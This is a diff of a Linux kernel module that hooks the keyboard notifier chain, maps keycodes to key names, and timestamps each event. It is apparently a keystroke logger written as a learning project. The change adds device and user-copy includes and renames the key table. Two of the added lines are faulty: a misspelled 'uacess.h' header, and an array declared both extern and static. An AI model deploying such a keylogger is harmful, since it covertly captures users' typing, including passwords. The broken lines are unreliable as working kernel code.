@@ -1,20 +1,22 @@
+#include <linux/fs.h>
 #include <linux/init.h>
 #include <linux/interrupt.h>
 #include <linux/kernel.h>
 #include <linux/keyboard.h>
+#include <linux/miscdevice.h>
 #include <linux/module.h>
 #include <linux/notifier.h>
 #include <linux/printk.h>
+#include <linux/slab.h>
 #include <linux/timekeeping.h>
 #include <linux/time.h>
+#include <linux/uacess.h>
 
-struct s_key {
-	uint64_t	keycode;
-	char		*name;
-	char		ascii;
-};
+#include "ft_key.h"
 
-static const struct s_key keys[] = {
+extern const struct s_key keys_table[];
+
+static const struct s_key keys_table[] = {
 	{0, "Nothing", '\0'},
 	{1, "Escape", '\033'},
 	{2, "one", '1'},
@@ -132,7 +134,7 @@ static const struct s_key keys[] = {
 static int	keyboard_event(struct notifier_block *nb, unsigned long action, void *data)
 {
 	struct keyboard_notifier_param	*param = data;
-	struct s_key			key = keys[param->value];
+	struct s_key			key = keys_table[param->value];
 	struct timespec64		ts;
 	struct tm			tm;
 
